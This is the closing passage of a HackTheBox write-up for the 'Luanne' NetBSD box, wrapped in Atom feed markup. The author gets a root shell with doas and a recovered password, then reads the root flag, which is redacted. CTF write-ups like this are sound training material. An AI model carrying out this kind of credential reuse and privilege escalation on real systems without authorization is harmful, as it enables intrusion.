&lt;p&gt;Just like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;doas&lt;/code&gt; requires that a password be informed where &lt;strong&gt;littlebear&lt;/strong&gt; worked like a charm, allowing us to get the root flag:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;doas /bin/sh
Password:
&lt;span class=&quot;c&quot;&gt;# hostname &amp;amp;&amp;amp; id&lt;/span&gt;
luanne.htb
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;wheel&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;wheel&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kmem&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,3&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sys&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;tty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,5&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;operator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,20&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;staff&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,31&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;guest&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,34&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nvmm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# cat /root/root.txt&lt;/span&gt;
&amp;lt;redacted&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I have enjoyed a lot this box as I had no prior experience with NetBSD or FreeBSD before.&lt;/p&gt;

&lt;p&gt;I hope you have also enjoyed and see you again soon in the next post! :smiley:&lt;/p&gt;</content><author><name>Davi Cruz</name></author><category term="Writeup" /><category term="HackTheBox" /><category term="htb-easy" /><category term="htb-linux" /><summary type="html">Hello everyone! The box of this week will be Luanne, another easy-rated Linux box from Hack The Box, created by polarbearer.</summary></entry></feed>